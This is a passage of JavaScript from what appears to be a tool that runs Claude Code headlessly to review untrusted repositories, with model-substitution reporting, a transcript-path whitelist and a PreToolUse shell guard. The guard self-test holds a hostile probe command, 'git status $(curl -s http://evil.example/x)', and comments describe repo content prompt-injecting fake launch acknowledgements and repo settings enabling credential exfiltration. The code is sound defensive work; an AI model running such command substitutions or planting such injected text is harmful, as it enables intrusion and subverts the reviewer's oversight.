  const MARKER = "[claude-code:unrecognized_model]";
  // Brace-BALANCED scan instead of the old non-greedy /(\{.*?\})/: a nested
  // payload ({"model":"x","meta":{"a":1}}) was cut at the inner "}" and then
  // dropped as malformed, silently losing the only evidence of a substitution
  // (R-14). A handful of "{" retries per marker keeps a broken opener from
  // hiding a well-formed object that follows it.
  for (let from = 0; ; ) {
    const at = text.indexOf(MARKER, from);
    if (at < 0) break;
    from = at + MARKER.length;
    let open = text.indexOf("{", from);
    for (let tries = 0; open >= 0 && tries < 4; tries++) {
      const end = matchBrace(text, open);
      if (end < 0) break;
      try {
        const j = JSON.parse(text.slice(open, end + 1));
        if (j?.model) out.push({ model: String(j.model), querySource: String(j.query_source ?? "") });
        break;
      } catch { open = text.indexOf("{", open + 1); /* broken opener: try the next one */ }
    }
  }
  return out;
}

/** realpath() of the nearest EXISTING ancestor, with the missing tail appended. */
function realpathNearest(p) {
  let cur = path.resolve(p);
  const missing = [];
  for (;;) {
    try {
      const real = fs.realpathSync(cur);
      return missing.length ? path.join(real, ...missing.reverse()) : real;
    } catch {
      const parent = path.dirname(cur);
      if (parent === cur) return path.resolve(p); // nothing on this path exists
      missing.push(path.basename(cur));
      cur = parent;
    }
  }
}

/**
 * A path the CLI itself could have written an agent transcript to: under the
 * OS temp dir, inside a claude* directory, under a tasks/ segment, ending in
 * .output. This is a whitelist, not a heuristic: the launch-ack text can be
 * model-authored (a synchronous Agent tool_result IS the reviewer's report), so
 * without a path boundary the server would read whatever file that text names.
 */
export function isAllowedTranscriptPath(filePath) {
  try {
    // Both sides go through realpath (R-7): the CLI names the REAL path, while
    // os.tmpdir() is the symlinked spelling on macOS ($TMPDIR is /var/…, the real
    // path is /private/var/…), so a plain string compare refused every genuine
    // transcript there and 429 recovery silently never fired. A path that does not
    // (yet) exist is resolved through its nearest existing ancestor, and the
    // containment rule is unchanged: the result must still live under the temp
    // root, so realpath can only ever make the check stricter about escapes.
    const p = realpathNearest(String(filePath));
    const tmp = realpathNearest(os.tmpdir());
    const rel = path.relative(tmp, p);
    if (!rel || rel.startsWith("..") || path.isAbsolute(rel)) return false;
    if (!/\.output$/i.test(p)) return false;
    const segs = rel.split(/[\\/]+/);
    return segs.some((seg) => /^claude/i.test(seg)) && segs.some((seg) => seg === "tasks");
  } catch {
    return false;
  }
}

/**
 * "This tool_result is a launch acknowledgement, not a report" — deliberately
 * weaker than parseAgentLaunchAck: it needs the anchored ack line plus one of
 * the two identifying lines, but NOT the transcript path (older CLI shapes omit
 * it). Used only to avoid filing an ack as a report; it never authorises a file
 * read, so the weaker check cannot widen the read surface.
 *
 * It is still a BLOCK, not a phrase: the ack sentence has to fill the first line
 * and everything after it has to be ack metadata. A report that merely STARTS
 * with the ack sentence used to be dropped as an ack (R-19) — losing the
 * findings AND leaving only the strict ack's `output_file` as a fallback.
 */
const ACK_HEAD = /^\s*Async agent launched successfully\.?/i;
const ACK_TAIL_LINE = [
  /^agentId\s*:\s*\S+/i,
  /^output_file\s*:\s*\S+/i,
  /^task_?id\s*:/i,
  /^\(?internal ID\b/i,
  /^Do NOT (?:Read|read) or tail\b/i,
  /^This tool result is internal metadata\b/i,
  /working in the background/i,
  /notified automatically/i,
  /^You can continue\b/i,
  /^Use the (?:TaskOutput|BashOutput|Agent) tool\b/i,
];
export function looksLikeLaunchAck(text) {
  const s = String(text ?? "");
  const nl = s.indexOf("\n");
  const firstLine = nl < 0 ? s : s.slice(0, nl);
  const head = ACK_HEAD.exec(firstLine);
  if (!head) return false;
  // The rest of the FIRST line must be ack-shaped too: nothing, or a
  // parenthetical ("(This tool result is internal metadata…)"). Trailing prose
  // ("…successfully? No — the real finding is: …") means the sentence is part of
  // a REPORT, and treating it as an ack would silently drop the report.
  const rest = firstLine.slice(head[0].length).trim();
  if (rest && !/^\([^)]*\)?$/.test(rest)) return false;
  if (!/agentId:\s*\S+/.test(s) && !/working in the background/i.test(s)) return false;
  // Every following line must be ack metadata. A substantive line means this is
  // a real report that merely opened with the ack sentence (repo content can
  // prompt-inject that opening), so it must not be filed away as an ack.
  if (nl < 0) return true;
  for (const line of s.slice(nl + 1).split(/\r?\n/)) {
    const l = line.trim();
    if (l && !ACK_TAIL_LINE.some((re) => re.test(l))) return false;
  }
  return true;
}

/**
 * An async Agent dispatch's tool_result is only a launch acknowledgement
 * ("Async agent launched successfully. … output_file: <path> …"). Detect that
 * shape and pull the transcript path out of it: when the agent never reports
 * (killed by a 429 / budget halt / timeout), that file is the only place its
 * partial work still exists.
 */
export function parseAgentLaunchAck(text) {
  const s = String(text ?? "");
  // The ack is a CLI-SHAPED block, not a phrase: it starts with the ack line,
  // names the agent, says the agent is running, and carries the transcript path
  // on a line of its own. A reviewer report that merely quotes the phrase (a
  // repo file can plant it) must not be mistaken for an ack — that would skip
  // the real report AND make the text choose a file for the server to read.
  if (!/^\s*Async agent launched successfully/.test(s)) return null;
  if (!/agentId:\s*\S+/.test(s)) return null;
  if (!/working in the background/i.test(s)) return null;
  const m = /^output_file:\s*(\S+)\s*$/m.exec(s);
  if (!m) return null;
  if (!isAllowedTranscriptPath(m[1])) return null;
  return { outputFile: m[1] };
}

/**
 * Best-effort recovery of a subagent's work from its JSONL transcript
 * (`output_file`): read the TAIL only (these files grow large), walk the
 * events backwards, and return the last assistant text as the partial report.
 * A killed mid-flight agent still leaves its analysis in there.
 */
export function recoverReportFromTranscript(filePath, maxBytes = 256 * 1024) {
  if (!filePath) return null;
  // Hard gate: never read outside the CLI's own transcript area, whoever asked.
  if (!isAllowedTranscriptPath(filePath)) return null;
  let fd;
  try {
    const size = fs.statSync(filePath).size;
    fd = fs.openSync(filePath, "r");
    const len = Math.min(size, maxBytes);
    const buf = Buffer.alloc(len);
    fs.readSync(fd, buf, 0, len, size - len);
    const lines = buf.toString("utf8").split(/\r?\n/).filter((l) => l.trim().startsWith("{"));
    for (let i = lines.length - 1; i >= 0; i--) {
      let ev;
      try { ev = JSON.parse(lines[i]); } catch { continue; }
      const content = ev?.message?.content;
      if (!Array.isArray(content)) continue;
      const texts = content
        .filter((b) => b?.type === "text" && typeof b.text === "string" && b.text.trim())
        .map((b) => b.text.trim());
      if (texts.length) {
        return { report: texts.join("\n\n"), partial: true, source: "output_file", transcriptBytes: size };
      }
    }
    return null;
  } catch {
    return null; // gone / unreadable — nothing to recover
  } finally {
    if (fd !== undefined) { try { fs.closeSync(fd); } catch { /* already closed */ } }
  }
}

const normModel = (s) => String(s || "").toLowerCase().replace(/\[[^\]]*\]$/, "").trim();

/**
 * The family a model name belongs to (opus/sonnet/haiku) — null when the name
 * carries no family token (a gateway model, or an old claude-2.x name).
 *
 * Needed because "claude-*" is NOT one family: a gateway that silently serves
 * claude-haiku when claude-sonnet was requested is exactly the downgrade this
 * provenance exists to report.
 */
const modelFamily = (m) => {
  const hit = /(?:^|[-_.])(opus|sonnet|haiku)(?:[-_.\d]|$)/.exec(m);
  return hit ? hit[1] : null;
};

/**
 * Is `effective` plausibly the model the caller asked for? A real Claude Code
 * session never reports a non-claude model name unless something rewrote it:
 * a gateway response tag (step-5-preview), a settings.json env mapping
 * (MiniMax-M3.1-Flash) or CLAUDE_CODE_SUBAGENT_MODEL. Aliases (opus) and dated
 * snapshots (claude-opus-5-20260101) still count as the same family.
 *
 * "Same family" is decided by the FAMILY token when both names carry one. The
 * old early-return `true` for every claude-* name made the comparison below
 * dead code, so the most common substitution of all — gateway downgrades
 * sonnet→haiku inside the Claude family — was reported as native.
 */
function sameModelFamily(effective, requested) {
  const e = normModel(effective);
  if (!e) return true; // unknown → never cry wolf
  const r = normModel(requested);
  // Nothing requested: a Claude session still reports a claude-* name, so any
  // other name means the model was rewritten (unchanged behaviour).
  if (!r) return e.startsWith("claude-");
  const ef = modelFamily(e);
  const rf = modelFamily(r);
  if (ef && rf) return ef === rf;
  return e === r || e.startsWith(r) || r.startsWith(e) || e.includes(r) || r.includes(e);
}

/**
 * Turn the observed model tags into an honest provenance statement. The whole
 * point: a review that silently ran on a substituted model is not comparable
 * to the same prompt in a direct Claude Code session, and the caller must be
 * told rather than left to diff two incomparable reports.
 */
// "<synthetic>" is a placeholder for messages the CLI renders itself (a forked
// slash command's answer). It is not a model and must never be reported as a
// substituted one.
const isSyntheticModel = (m) => typeof m === "string" && /^<[^>]*>$/.test(m);

export function buildModelProvenance({ requestedModel, mainModels = [], subagentModels = [], unrecognized = [], billedModels = [] } = {}) {
  const main = [...new Set(mainModels.filter((m) => m && !isSyntheticModel(m)))];
  const billed = [...new Set(billedModels.filter((m) => m && !isSyntheticModel(m)))];
  const subagents = [...new Set([...subagentModels, ...unrecognized.map((u) => u.model)].filter((m) => m && !isSyntheticModel(m)))];
  const requested = requestedModel ? String(requestedModel) : null;
  const foreignMain = main.filter((m) => !sameModelFamily(m, requested));
  const foreignSub = subagents.filter((m) => !sameModelFamily(m, requested));
  // modelUsage keys are the authoritative list of models that actually served
  // requests (main loop + subagents + sidechains). A foreign name there is proof
  // of substitution even when the stream tags were missing or truncated.
  const foreignBilled = billed.filter((m) => !sameModelFamily(m, requested) && !foreignMain.includes(m) && !foreignSub.includes(m));
  const substituted = foreignMain.length > 0 || foreignSub.length > 0 || foreignBilled.length > 0;
  let note = "";
  if (substituted) {
    const parts = [`requested: ${requested || "claude's default (no --model was passed)"}`];
    if (foreignMain.length) parts.push(`main session actually ran on: ${foreignMain.join(", ")}`);
    if (foreignSub.length) parts.push(`reviewer subagents ran on: ${foreignSub.join(", ")}`);
    if (foreignBilled.length) parts.push(`billed models: ${foreignBilled.join(", ")}`);
    note =
      `⚠ MODEL SUBSTITUTION — this review did NOT run on the requested Claude model (${parts.join(" · ")}). ` +
      `A local gateway (CC Switch / ANTHROPIC_BASE_URL) or ~/.claude/settings.json env ` +
      `(CLAUDE_CODE_SUBAGENT_MODEL, ANTHROPIC_DEFAULT_*_MODEL_NAME) rewrites the model, so this output is NOT ` +
      `comparable to the same prompt run directly in Claude Code, and every reviewer subagent is an instance of ` +
      `the substituted model. claude itself logged ` +
      `[claude-code:unrecognized_model] for ${unrecognized.length || "the"} substituted request(s). ` +
      `Switch the provider back (or unset those env keys) and re-run for a Claude-native review.`;
  }
  return { substituted, requested, main, subagents, billed, note };
}

/**
 * The result event's accounting facts (claude's own field docs):
 *  - modelUsage: per-model totals for every call through the query pipeline —
 *    main loop, Task subagents, sidechains, internal calls. The authoritative
 *    list of models that actually billed.
 *  - subagent_stats: spawned/completed/failed/killed{parent,user,system},
 *    started_in_background, by_type, max_depth, and the run_in_background
 *    request counts. "System" kills include the --max-budget-usd halt.
 *  - usage: token totals; safety_stops / terminal_reason: why the loop ended.
 * Pure so the tests can feed it the exact result shapes.
 */
export function resultFacts(j) {
  if (!j || typeof j !== "object") return {};
  const facts = {};
  if (j.modelUsage && typeof j.modelUsage === "object" && !Array.isArray(j.modelUsage)) {
    facts.modelUsage = j.modelUsage;
  }
  if (j.subagent_stats && typeof j.subagent_stats === "object" && !Array.isArray(j.subagent_stats)) {
    facts.subagentStats = j.subagent_stats;
  }
  if (j.usage && typeof j.usage === "object" && !Array.isArray(j.usage)) {
    facts.usage = j.usage;
  }
  if (typeof j.safety_stops === "number") facts.safetyStops = j.safety_stops;
  if (typeof j.terminal_reason === "string") facts.terminalReason = j.terminal_reason;
  return facts;
}

function execTarget(cli) {
  return cli.kind === "node-script"
    ? { cmd: process.execPath, baseArgs: [cli.path] }
    : { cmd: cli.path, baseArgs: [] };
}

const versionCache = new Map(); // path -> { value, at }
const versionInflight = new Map();
const helpCache = new Map();    // path -> { text, at }
const helpInflight = new Map();

/**
 * How long a `--version` / `--help` answer stays authoritative (R-9).
 *
 * A long-lived MCP server outlives an in-place upgrade (npm reinstall into the
 * same prefix, brew upgrade, a version-manager switch), and the file-existence
 * check in resolveClaudeCli() cannot see it because the path did not change. An
 * untimed cache then kept the OLD verdicts forever: the version floors in
 * index.js could permanently skip `--permission-mode manual` (silent hardening
 * downgrade) or keep a newly supported flag disabled. Same 5-minute window as
 * the guard self-test, which exists for exactly the same drift.
 */
const CLI_PROBE_TTL_MS = 5 * 60 * 1000;

/** The cached entry for `key` while it is still inside the TTL, else undefined. */
function freshProbe(cache, key) {
  const hit = cache.get(key);
  return hit && Date.now() - hit.at < CLI_PROBE_TTL_MS ? hit : undefined;
}

/** `claude --version` (async so the MCP event loop is never blocked). Cached, in-flight deduped. */
export async function claudeVersion(cli) {
  const hit = freshProbe(versionCache, cli.path);
  if (hit) return hit.value;
  if (versionInflight.has(cli.path)) return versionInflight.get(cli.path);
  const { cmd, baseArgs } = execTarget(cli);
  const p = (async () => {
    const { stdout } = await execFileAsync(cmd, [...baseArgs, "--version"], {
      timeout: 30000, windowsHide: true, env: buildClaudeEnv(),
    });
    const v = (stdout || "").trim();
    versionCache.set(cli.path, { value: v, at: Date.now() });
    return v;
  })().finally(() => versionInflight.delete(cli.path));
  versionInflight.set(cli.path, p);
  return p;
}

/**
 * The installed version as a comparable "x.y.z" string, or null when it cannot
 * be read. Gateways/wrappers that print a banner instead of a version, or a
 * beta like "2.1.301-beta.1", must not be mistaken for a usable version number.
 */
export async function claudeSemver(cli) {
  const raw = await claudeVersion(cli);
  const m = /(\d+)\.(\d+)\.(\d+)/.exec(String(raw || ""));
  return m ? `${m[1]}.${m[2]}.${m[3]}` : null;
}

/**
 * Feature floors. `--permission-mode manual` and `--permission-prompts none` are
 * both documented as newer-CLI options; passing them to an older claude makes it
 * exit with "unknown option" and the whole review fails with an unhelpful
 * "no parseable result JSON" message.
 */
export const PERMISSION_MODE_MANUAL_MIN = "2.1.200";
export const PERMISSION_PROMPTS_MIN = "2.1.259";

/** `version` >= `min`, or null when the version is unknown (caller decides). */
export function versionAtLeast(version, min) {
  if (!version) return null;
  return cmpVer(version, min) >= 0;
}

/** Full `claude --help` text (async, cached, in-flight deduped). Rejects if claude can't run. */
export async function claudeHelp(cli) {
  const hit = freshProbe(helpCache, cli.path);
  if (hit) return hit.text;
  if (helpInflight.has(cli.path)) return helpInflight.get(cli.path);
  const { cmd, baseArgs } = execTarget(cli);
  const p = (async () => {
    const { stdout } = await execFileAsync(cmd, [...baseArgs, "--help"], {
      timeout: 30000, windowsHide: true, env: buildClaudeEnv(), maxBuffer: 8 * 1024 * 1024,
    });
    helpCache.set(cli.path, { text: stdout || "", at: Date.now() });
    return stdout || "";
  })().finally(() => helpInflight.delete(cli.path));
  helpInflight.set(cli.path, p);
  return p;
}

/**
 * True when the installed claude CLI supports a flag like "--effort".
 *
 * Token-boundary match, not `includes`: a plain substring test answers "yes" for
 * `--effort` when the help text only documents `--effort-level`, and the run then
 * dies on an unknown-option error.
 */
export async function supportsFlag(cli, flag) {
  try {
    const help = await claudeHelp(cli);
    const re = new RegExp(flag.replace(/[.*+?^${}()|[\]\\-]/g, "\\$&") + "(?![\\w-])");
    return re.test(help);
  } catch {
    return false; // CLI can't even print help: assume no optional flags
  }
}

/** `--output-format stream-json` (line-delimited events; needs --verbose). */
export async function supportsStreamJson(cli) {
  return supportsFlag(cli, "stream-json");
}

/** `--permission-prompts none`: anything that would prompt is denied outright. */
export async function supportsPermissionPrompts(cli) {
  return supportsFlag(cli, "--permission-prompts");
}

export { analyseCommand, detectShellChaining, gitWriteFlagReason, guardVerdict, shellChainingNote, shellGuardNote } from "./shell-guard.js";

/** Remove the temporary guard settings file once the run is over. */
export function removeGuardSettings(file) {
  if (!file) return;
  guardSettingsFiles.delete(file); // the Set tracks live files; drop dead paths
  try { fs.rmSync(file, { force: true }); } catch { /* temp dir cleanup is best effort */ }
}

// Every guard settings file this process wrote. runClaude removes its own file
// when the run settles, but guardState()/guardSelfTest() and the early-return
// paths in the tool handlers create files nobody removed — one leak per env
// check per process. cleanupGuardSettings() is called by the env tool and on
// process exit so nothing survives the server.
const guardSettingsFiles = new Set();
// Files handed to a run that has not spawned claude yet. cleanupGuardSettings()
// skips these: between writeGuardSettings() and the spawn sit several awaits,
// and a concurrent claude_review_env could delete the file in that window — the
// review would then run with --settings pointing at nothing, i.e. unguarded
// while the report claimed the hardening was on.
const guardSettingsInFlight = new Set();
export function markGuardSettingsInFlight(file, on) {
  if (!file) return;
  if (on) guardSettingsInFlight.add(file);
  else guardSettingsInFlight.delete(file);
}
export function cleanupGuardSettings() {
  for (const f of [...guardSettingsFiles]) {
    if (guardSettingsInFlight.has(f)) continue;
    removeGuardSettings(f);
    guardSettingsFiles.delete(f);
  }
}

/**
 * One-shot sweep of artifacts leaked by earlier server processes in our temp
 * dir: guard-settings-*.json (one used to leak on every early-return path and
 * every claude_review_env call) and cc-code-review-git-* homes (one per process).
 * Only files older than 2h are removed so a concurrent server's live files are
 * never touched. Runs once per process, on the first guard write.
 */
let sweptTempArtifacts = false;
function sweepTempArtifacts(dir) {
  if (sweptTempArtifacts) return;
  const cutoff = Date.now() - 2 * 60 * 60 * 1000;
  let names;
  // The one-shot flag is latched AFTER the read (R-16). Setting it first meant a
  // single transient EACCES/ENOENT disabled this process's cleanup forever, so
  // every artifact it was meant to reclaim leaked until the process exited.
  try { names = fs.readdirSync(dir); } catch { return; }
  sweptTempArtifacts = true;
  for (const name of names) {
    const p = path.join(dir, name);
    try {
      const st = fs.statSync(p);
      if (st.mtimeMs >= cutoff) continue;
      if (/^guard-settings-.*\.json$/.test(name) && st.isFile()) fs.rmSync(p, { force: true });
      // A journal a live run still references must survive the sweep: deleting
      // it would leave the result metadata (partial_reports_file) pointing at a
      // path that no longer exists, which is the opposite of what retention
      // promises. A settled run removes its own entry (see finish()).
      else if (/^subagents-.*\.jsonl$/.test(name) && st.isFile() && !activeSubagentFiles.has(p)) fs.rmSync(p, { force: true });
      else if (/^cc-code-review-git-/.test(name) && st.isDirectory()) fs.rmSync(p, { recursive: true, force: true });
    } catch { /* best effort */ }
  }
}

/** The hook command line Claude Code will run. Both paths quoted: node's
 *  default install dir is "C:\Program Files\nodejs" on Windows, and hook
 *  commands are executed through a shell. */
export function guardHookCommand() {
  return `"${process.execPath.replace(/\\/g, "/")}" "${HOOK_SCRIPT.replace(/\\/g, "/")}"`;
}

/** Absolute path of the guard hook script (for error messages). */
export function hookScriptPath() {
  return HOOK_SCRIPT;
}

/** Whether the shell guard is switched on, and whether its script is present. */
export function shellGuardStatus() {
  if (process.env.CLAUDE_REVIEW_SHELL_GUARD === "0") return { enabled: false, reason: "disabled via CLAUDE_REVIEW_SHELL_GUARD=0" };
  if (!fs.existsSync(HOOK_SCRIPT)) return { enabled: false, reason: `hook script missing: ${HOOK_SCRIPT}` };
  return { enabled: true, reason: "PreToolUse hook installed per run" };
}

/**
 * Resolve the guard into one of three honest states.
 *
 * "failed" is deliberately distinct from "off": a guard that could not be
 * installed must not be reported as a user choice, and the caller should refuse
 * to review an untrusted repo unguarded rather than proceed quietly.
 */
export function guardState() {
  const st = shellGuardStatus();
  if (!st.enabled) return { state: "off", reason: st.reason };
  try {
    const probe = writeGuardSettings();
    if (!probe) return { state: "failed", reason: "could not write the guard settings file" };
    // The probe only proves the directory is writable; the run writes its own
    // file (prepareRunHardening) and finish() removes that one. Deleting the
    // probe here stops the ~600B-per-agentic-run leak that used to survive
    // until the 2h sweep.
    removeGuardSettings(probe);
    return { state: "on", reason: st.reason };
  } catch (err) {
    return { state: "failed", reason: String(err?.message || err) };
  }
}

/**
 * Prove the guard actually FIRES, rather than trusting that the file exists.
 *
 * `guardState()` can only check that the script is on disk. A hook that cannot
 * be spawned (node path changed after a version-manager switch, package moved,
 * import broken) is meant to fail closed via `onFailure: "block"`, but that
 * behaviour is CLI-version dependent — so the server verifies it directly with
 * two synthetic payloads: one chained command that MUST be denied and one clean
 * command that must NOT be. One ~50ms spawn each.
 *
 * Cached per process, but a long-lived MCP server outlives any single install:
 * the hook script (or node) can be replaced or deleted underneath us — an npm
 * update, a version-manager switch, AV quarantine — while the cached "ok" keeps
 * vouching for a guard that no longer fires. So the cache carries a TTL and is
 * re-verified (3 cheap spawns) at most every SELF_TEST_TTL_MS.
 */
const SELF_TEST_TTL_MS = 5 * 60 * 1000;
let guardSelfTestCache;
let guardSelfTestCacheAt = 0;
export async function guardSelfTest({ refresh = false } = {}) {
  if (!refresh && guardSelfTestCache !== undefined && Date.now() - guardSelfTestCacheAt < SELF_TEST_TTL_MS) {
    return guardSelfTestCache;
  }
  const result = await guardSelfTestProbe();
  guardSelfTestCache = result;
  guardSelfTestCacheAt = Date.now();
  return result;
}

async function guardSelfTestProbe() {
  const st = shellGuardStatus();
  if (!st.enabled) {
    return { ok: false, reason: st.reason };
  }
  const probe = (payload, via = "argv") => new Promise((resolve) => {
    let child;
    const spawnOpts = {
      env: { ...buildClaudeEnv(), CLAUDE_REVIEW_REPO_ROOT: os.tmpdir() },
      stdio: ["pipe", "pipe", "pipe"], windowsHide: true,
    };
    try {
      // via="argv": spawn node + script directly (proves the hook itself works).
      // via="shell": spawn guardHookCommand() through a shell (proves the EXACT
      // string Claude Code's hook runner executes renders and runs — a quoting
      // regression there would leave the argv probe green while every real Bash
      // call dies to onFailure:"block").
      child = via === "shell"
        ? spawn(guardHookCommand(), { ...spawnOpts, shell: true })
        : spawn(process.execPath, [HOOK_SCRIPT], spawnOpts);
    } catch (e) {
      resolve({ decision: null, error: String(e?.message || e) });
      return;
    }
    // A wedged hook (AV, dead mount) would leave this promise unsettled and
    // hang the caller forever — no other timeout exists on this path.
    const killer = setTimeout(() => { try { child.kill("SIGKILL"); } catch { /* gone */ } }, 15_000);
    let out = "";
    let err = "";
    child.stdout.on("data", (d) => { out += d; });
    child.stderr.on("data", (d) => { err += d; });
    child.on("error", (e) => { clearTimeout(killer); resolve({ decision: null, error: String(e?.message || e) }); });
    child.on("close", (code) => {
      clearTimeout(killer);
      let decision = null;
      try { decision = JSON.parse(out.trim().split(/\r?\n/).filter(Boolean).pop() || "{}"); } catch { /* no output = allow */ }
      resolve({ decision, code, stderr: err.slice(0, 300) });
    });
    child.stdin.on("error", () => { /* EPIPE: hook died before reading; close handler reports it */ });
    child.stdin.end(JSON.stringify(payload));
  });
  const decisionOf = (r) => r?.decision?.hookSpecificOutput?.permissionDecision;

  // The probe must be a construct the policy can never allow, not merely a
  // program that is absent today: a `git status; curl x` probe would start
  // passing if curl were ever added to the policy, while command substitution
  // is refused structurally, whatever the program list says.
  const bad = await probe({ tool_name: "Bash", tool_input: { command: "git status $(curl -s http://evil.example/x)" } });
  if (decisionOf(bad) !== "deny") {
    return {
      ok: false,
      reason: `the hook did not deny a command-substitution probe (exit ${bad.code ?? "?"}${bad.error ? `, spawn error ${bad.error}` : ""})` +
        ` — if cc-code-review was just updated, this process is still running the previous version while the hook on disk is the new one; restart the MCP host`,
    };
  }
  const good = await probe({ tool_name: "Bash", tool_input: { command: "git status" } });
  if (decisionOf(good) === "deny") {
    return {
      ok: false,
      reason: `the hook denied a clean command (${good.decision?.hookSpecificOutput?.permissionDecisionReason || "no reason"})`,
    };
  }
  // Same deny probe, but through the shell-rendered command line — the path the
  // CLI actually takes. On Windows this is `cmd /d /s /c` on the quoted string,
  // on unix `/bin/sh -c`; if quoting cannot survive it, the guard is not real.
  const shelled = await probe({ tool_name: "Bash", tool_input: { command: "git status $(curl -s http://evil.example/x)" } }, "shell");
  if (decisionOf(shelled) !== "deny") {
    return {
      ok: false,
      reason: `the hook command does not survive shell rendering (${shelled.error ? `spawn error ${shelled.error}` : `exit ${shelled.code ?? "?"}, no deny decision`}) — ` +
        `check guardHookCommand() quoting for node at ${process.execPath} and the hook at ${HOOK_SCRIPT}`,
    };
  }
  // The hook is spawned from disk on every call while this process keeps the
  // policy it loaded at startup. The probes above are structural, so they pass on
  // BOTH versions — after an upgrade without a restart the server and the hook
  // disagree while everything looks green. Compare the policy fingerprints and
  // refuse on a mismatch (this is the "refuses to run" README/SECURITY promise).
  const remote = await new Promise((resolve) => {
    let child;
    try {
      child = spawn(process.execPath, [HOOK_SCRIPT], {
        env: { ...buildClaudeEnv(), CC_REVIEW_GUARD_INFO: "1" },
        stdio: ["ignore", "pipe", "pipe"],
        windowsHide: true,
      });
    } catch { resolve(null); return; }
    const killer = setTimeout(() => { try { child.kill("SIGKILL"); } catch { /* gone */ } }, 15_000);
    let out = "";
    child.stdout.on("data", (d) => { out += d; });
    child.on("error", () => { clearTimeout(killer); resolve(null); });
    child.on("close", () => {
      clearTimeout(killer);
      try { resolve(JSON.parse(out.trim().split(/\r?\n/).filter(Boolean).pop() || "{}")); } catch { resolve(null); }
    });
  });
  const localFp = policyFingerprint();
  if (!remote || remote.fingerprint !== localFp) {
    return {
      ok: false,
      reason:
        `the hook on disk enforces a different policy than this process (server ${localFp}, hook ${remote?.fingerprint ?? "unreadable"}) — ` +
        "this process is still running the previous version while the hook file is the new one. Restart the MCP host (or ZCode) to apply the upgrade.",
    };
  }
  return { ok: true, reason: "verified: an unsafe command is denied (direct and via the shell-rendered command), a clean one allowed, and the hook's policy matches this process" };
}

/**
 * Write the extra settings file that installs the PreToolUse guard.
 *
 * `--setting-sources user` keeps the reviewed repo's own .claude/settings.json
 * out of the picture, but it does not extend the permission engine: Bash rules
 * prefix-match the whole command, so a single compound command satisfies a rule
 * meant for its first token, and Edit/Write have no notion of "inside this
 * directory" at all. A hook is the only mechanism that sees the real call before
 * it runs, and it also covers the reviewer's subagents, which never appear in
 * the parent's stream-json output.
 *
 * `onFailure: "block"` matters: if the hook cannot even be spawned (node path
 * vanished after a version-manager switch, package moved), Claude Code treats
 * that as a non-blocking error and the tool call proceeds anyway — which would
 * silently uninstall the guard exactly when it is most needed.
 *
 * Returns the settings path, or null when the guard is switched off.
 */
export function writeGuardSettings(extra = {}) {
  // `extra` carries claude's own top-level settings keys that this run needs —
  // currently `ultracode` (standing dynamic-workflow orchestration, applied via
  // --settings). The guard hooks are the security part; the extras must still
  // be written when the guard is explicitly disabled, or ultracode would be
  // silently dropped in unguarded mode.
  const hasExtra = extra && Object.keys(extra).length > 0;
  if (!shellGuardStatus().enabled && !hasExtra) return null;
  try {
    const dir = path.join(os.tmpdir(), "cc-code-review");
    fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
    // mode: only applies on CREATE. On Linux /tmp is shared, so a pre-created
    // /tmp/cc-code-review (or a symlink to an attacker-owned directory) would
    // receive guard-settings-*.json — which claude reads at spawn time, i.e. the
    // attacker could substitute the hook that is supposed to police this run.
    // Refuse links, require our own uid, and force 0700 on the existing dir.
    const dirStat = fs.lstatSync(dir);
    if (dirStat.isSymbolicLink()) throw new Error("refusing a symlinked guard directory");
    if (!dirStat.isDirectory()) throw new Error("guard path is not a directory");
    if (typeof process.getuid === "function" && dirStat.uid !== process.getuid()) {
      throw new Error("guard directory owned by uid " + dirStat.uid + ", not " + process.getuid());
    }
    if (process.platform !== "win32") fs.chmodSync(dir, 0o700);
    sweepTempArtifacts(dir);
    const file = path.join(dir, `guard-settings-${process.pid}-${Math.random().toString(36).slice(2, 8)}.json`);
    fs.writeFileSync(file, JSON.stringify({
      ...(extra || {}),
      ...(shellGuardStatus().enabled ? {
        hooks: {
          PreToolUse: [{
            matcher: "Bash|Write|Edit|MultiEdit|NotebookEdit|Read",
            hooks: [{ type: "command", command: guardHookCommand(), onFailure: "block" }],
          }],
        },
      } : {}),
    }, null, 2), { mode: 0o600 });
    guardSettingsFiles.add(file);
    return file;
  } catch {
    return null; // a broken guard must not take the review down with it
  }
}

/**
 * Run Claude Code headlessly.
 *
 * - The prompt is piped via stdin (never interpolated into argv), which avoids
 *   all Windows shell-quoting problems with long multi-line prompts.
 * - stdout/stderr are collected as Buffers and decoded once at the end —
 *   per-chunk utf8 decoding would corrupt multi-byte characters that straddle
 *   pipe chunk boundaries (Chinese reports hit this reliably).
 * - `--setting-sources user`: the reviewed repo may ship its own
 *   .claude/settings.json (project/local scope). Loading it would execute
 *   repo-controlled SessionStart hooks and let it override ANTHROPIC_* —
 *   i.e. arbitrary code execution + credential exfiltration from untrusted repos.
 * - `--permission-mode manual`: fail-closed. Anything outside --allowedTools is
 *   hard-denied instead of being judged by the (model-driven) permission
 *   classifier, which prompt injection can talk around.
 */
export function runClaude({
  cli,
  repoPath,
  prompt,
  // Appended to claude's own system prompt. Used by the native pipeline: the
  // built-in /code-review command owns the procedure, so our output contract and
  // scope notes must travel beside it instead of being glued onto the command
  // line (where the command would read them as its target argument).
  appendSystemPrompt,
  // Slash commands (e.g. the built-in /code-review) are expanded only from the
  // prompt passed as an ARGUMENT; a prompt piped through stdin is treated as
  // literal text. The native pipeline therefore passes its one-line command in
  // argv, and the long fleet prompt keeps using stdin (no quoting limits).
  promptViaArgv = false,
  allowedTools = [],
  disallowedTools = [],
  model,
  maxTurns = 80, // note: --max-turns is accepted by the CLI but not in --help (undocumented)
  maxBudgetUsd,
  resumeSessionId,
  effort,
  flags = { effort: false, budget: false },
  guardSettings,
  // Where the incremental subagent JSONL lands. index.js passes logsDir() so the
  // artifact honours CLAUDE_REVIEW_LOG_DIR like the run logs do.
  subagentsDir,
  timeoutMs = 20 * 60 * 1000,
  signal,
  // Called the moment a reviewer subagent's report completes in the stream —
  // one call per subagent, in completion order, long before the parent's
  // synthesis. Lets the caller deliver reports incrementally instead of
  // waiting for the whole fleet.
  onSubagentReport,
}) {
  return new Promise((resolve) => {
    // A signal already aborted before we even spawn: never start a paid run.
    if (signal?.aborted) {
      guardSettingsInFlight.delete(guardSettings);
      removeGuardSettings(guardSettings);
      resolve({ ok: false, json: null, stdout: "", stderr: "", timedOut: false, cancelled: true, exitCode: null, durationMs: 0 });
      return;
    }

    const { cmd, baseArgs } = execTarget(cli);
    const args = [...baseArgs, "-p"];
    if (promptViaArgv) args.push(prompt);
    args.push("--max-turns", String(maxTurns));
    // stream-json is the only output that shows which tools actually ran. It
